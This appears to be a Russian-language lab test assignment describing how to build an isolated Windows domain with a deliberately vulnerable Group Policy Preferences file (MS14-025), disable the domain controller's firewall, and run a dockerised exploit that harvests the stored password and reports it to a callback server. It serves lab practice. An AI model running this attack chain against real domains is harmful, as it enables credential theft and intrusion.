# test
# Тестовое задание: эксплуатация MS14-025 (GPP) с callback-сервером

## 1. Схема сети
| Роль | ОС | IP-адрес | Имя хоста / домен |
|------|----|----------|-------------------|
| Контроллер домена (DC) | Windows Server 2022 | 10.10.10.10 | `dc.lab.local` (домен `lab.local`) |
| Клиент (жертва) | Windows 10 | 10.10.10.20 | `pc01.lab.local` |
| Атакующий | Ubuntu 22.04 / Kali | 10.10.10.30 | `attacker` |

Все машины подключены к одной изолированной сети (VMware: Host-Only).

## 2. Подготовка инфраструктуры на контроллере домена
Все команды выполняются в PowerShell от имени администратора на DC (`10.10.10.10`).

### 2.1. Создание пользователя `user`
$password = ConvertTo-SecureString "Val-9162988" -AsPlainText -Force
New-ADUser -Name "user" -UserPrincipalName "user@lab.local" -AccountPassword $password -Enabled $true

### 2.2. Создание уязвимой GPP (MS14-025)
Создала локального пользователя gppuser с паролем P@ssw0rd через групповую политику. Файл Groups.xml будет сохранён в SYSVOL.
$guid = "31B2F340-016D-11D2-945F-00C04FB984F9"   
$path = "\\lab.local\SysVol\lab.local\Policies\{$guid}\Machine\Preferences\Groups"
New-Item -Path $path -ItemType Directory -Force | Out-Null
$xml = @'
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="gppuser" image="0" changed="2025-01-01 00:00:00" uid="{F6A6D8C2-3B2E-4A6D-8E9A-123456789ABC}">
    <Properties action="C" fullName="" description="" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="" userName="gppuser"/>
  </User>
</Groups>
'@
$xml | Out-File -FilePath "$path\Groups.xml" -Encoding UTF8
      
### 2.3. Выдача прав пользователю user на чтение SYSVOL
icacls "\\lab.local\SYSVOL" /grant "LAB\user:(RX)" /T

### 2.4. Отключение брандмауэра на DC
Нужно отключить брандмауэр для лабораторного теста
netsh advfirewall set allprofiles state off

## 3. Файлы эксплойта и callback-сервера
На атакующей машине (10.10.10.30) нужно создать (или перенести) три файла: exploit.py, collback_server.py и Dockerfile
Также желательно сразу проверить доступность файла Groups.xml 
smbclient //10.10.10.10/SYSVOL -U 'lab.local\user%Val-9162988' -c 'ls lab.local/Policies/*/Machine/Preferences/Groups/Groups.xml'

## 4. Сборка Docker-образа
На атакующей машине, в папке с файлами собираем Docker-Образ
docker build -t ad-exploiter .

## 5. Запуск атаки
В отдельном терминале нужно запустить callback_server
python3 callback_server.py
В другом запускаем контейнер с эксплойтом
docker run --network host --add-host lab.local:10.10.10.10 --rm ad-exploiter gpp --target 10.10.10.10 --domain lab.local --username user --password Val-9162988 --callback-url http://10.10.10.30:8080/callback

Для атак Bronze Bit и NTLM Relay to LDAP требуются дополнительные данные (NTLM-хэш сервисной учётной записи, настройка релея).
